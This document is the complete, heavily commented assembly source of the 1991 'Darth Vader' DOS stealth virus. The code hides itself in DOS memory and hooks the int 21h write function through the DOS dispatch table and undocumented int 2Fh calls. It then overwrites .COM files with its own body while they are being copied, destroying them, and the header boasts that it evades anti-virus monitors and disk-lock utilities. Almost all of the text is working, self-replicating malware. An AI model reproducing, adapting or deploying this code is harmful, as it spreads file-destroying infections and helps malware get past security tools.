;*******************************************************************************
;*									       *
;*		   D A R T H   V A D E R   -  stealth virus		       *
;*									       *
;*	 (C) - Copyright 1991 by Waleri Todorov, CICTT			       *
;*	 All Rights Reserved						       *
;*									       *
;*	 Virus infect ANY com file exept COMMAND.COM. He use iternal DOS       *
;*	 dispatcher for int21 functions, so it cannot be stoped by programs    *
;*	 like ANTI4US etc... He also cannot be stoped by disk lock utilities   *
;*	 because the virus use WRITE function (40h) of DOS' int21.             *
;*	 Always when you copy COM file with DOS' 'copy' command or PCTools     *
;*	 class programm, you will receive infected (destroyed) copy  of file   *
;*	 Infected file won't work, but the virus WILL                          *
;*									       *
;*						     Waleri Todorov	       *
;*									       *
;*******************************************************************************
		nop			; Dummy NOPs. Required
		nop

		mov	ah,30h		; Get DOS version
		int	21h
		cmp	al,5		; If DOS is NOT 5.X
		jb	OkDOS		; Continue
Exit					; else terminate
		int	20h
OkDos
		mov	ax,1203h	; Get DOS segment
		int	2fh		; Via interrupt 2F (undocumented)

		mov	si,9000h	; Set ES to 9000
		mov	es,si		; Usualy this area is fill with zeros
		xor	si,si		; SI=0
Next
		inc	si		; Next byte
		cmp	si,0F00h	; If SI==0xF00
		ja	Exit		; Then no place found and exit to DOS
		push	si		; else Save SI in stack
		xor	di,di		; ES:DI == 9000:0000
		mov	cx,offset lastbyte-100h ; Will check virus size
		repe	cmpsb		; Check until equal
		jcxz	Found		; if CX==0 then place is found
		pop	si		; else restore SI from stack
		jmp	short Next	; and go search next byte
Found
		pop	di		; Restore saved SI to DI
		mov	cs:MyPlace,di	; Save new offset in DOS segment
		mov	[2],di		; at DOSSEG:0002
		mov	si,100h 	; SI will point beginning in file
		push	ds		; Save DS
		push	ds		; Set ES equal to DS
		pop	es		;
		push	cs		; Set DS=CS
		pop	ds		;
		mov	cx,offset LastByte-100h ; Will move virus size only
		rep	movsb		; Do move
		pop	ds		; Restore DS (point to DOSSEG)

		push	si		; From this place will search DOS table
NextTable
		pop	si		;
		inc	si		; Next byte
		jz	Exit		; If segment end then exit
		push	si		; Save SI
		lodsw			; Load AX from DS:SI
		xchg	ax,bx		; Put AX in BX
		lodsb			; and load AL from DS:SI
		cmp	bx,8B2Eh	; Check for special bytes
		jne	NextTable	; in AL and BX
		cmp	al,9Fh
		jne	NextTable	; If not match -> search next byte
FoundTable
		lodsw			; Else load table address to AX

		xchg	ax,bx		; Put table address to BX
		mov	si,[bx+80h]	; Load current offset of 40h function
		mov	di,offset Handle	; Put its offset to DI
		mov	cx,5		; Will check 5 bytes only
		push	cs		; ES:DI point handling of 40 in file
		pop	es
		repe	cmpsb		; Check if DS:SI match to ES:DI
		jcxz	Exit		; If match -> virus is here -> Exit
		mov	ax,[bx+80h]	; else load offset of function 40
		mov	[4],ax		; And save it to DOSSEG:0004
		mov	ax,offset Handle-100h	; Load absolute address of
		add	ax,cs:MyPlace	; new handler and adjust its location
		mov	[bx+80h],ax	; Store new address in DOS table

		int	20h		; Now virus is load and active

Handle					; Handle function 40h of int 21
		push	ax		; Save important registers
		push	bx
		push	cx
		push	ds
		push	es
		push	si
		push	di

		cmp	cx,270d 	; Check if write less than virus size
		jb	Do		; If so -> write with no infection

		mov	cs:[0C00h],ds	; Save buffer segment in DOSSEG:0C00
		mov	cs:[0C02h],dx	; Save buffer offset in DOSSEG:0C02

		mov	ax,1220h	; Get number of File Handle table
		int	2fh		; Via int 2F (undocumented)
		mov	bl,es:[di]	; Load number to BL
		mov	ax,1216h	; Get File Handle table address
		int	2fh		; Via int 2F (undocumented)

		push	di		; Save table offset
		add	di,20h		; Now offset point to NAME  of file

		push	cs		; DS now will point in virus
		pop	ds

		mov	si,offset Command-100h	; Address of string COMM
		add	si,cs:[2]	; Adjust for different offset in DOS
		mov	cx,4		; Check 4 bytes
		repe	cmpsb		; Do check until equal
		pop	di		; Restore address of table
		jcxz	Do		; If match ->  file is COMMand.XXX

		add	di,28h		; Else DI point to EXTENSION of file
		mov	si,offset Com-100h	; Address of string COM
		add	si,cs:[2]	; Adjust for different offset in DOS
		mov	cx,3		; Check 3 bytes
		repe	cmpsb		; Do check until equal
		jne	Do		; If NOT *.COM file -> write normal

		mov	di,cs:[0C02h]	; Else restore data buffer from
		mov	es,cs:[0C00h]	; DOSSEG:0C00 & DOSSEG:0C02
		mov	si,cs:[2]	; Get virus start offset
		mov	cx,offset LastByte-100	; Will move virus only
		rep	movsb		; Move its code in data to write

; Now virus is placed in data buffer of COPY command or PCTools etc...
; When they write to COM file they write virus either

Do
		pop	di		; Restore importatnt registers
		pop	si
		pop	es
		pop	ds
		pop	cx
		pop	bx
		pop	ax

		db	36h,0FFh,16h,4,0       ; CALL SS:[4] (call original 40)
		ret				; Return to caller (usualy DOS)

Command 	db     'COMM'           ; String for check COMMand.XXX
Com		db	'COM'           ; String for check *.COM

		db	'Darth Vader'   ; Signature


LastByte	nop			; Mark to calculate virus size

MyPlace
		dw	0		; Temporary variable. Not writed
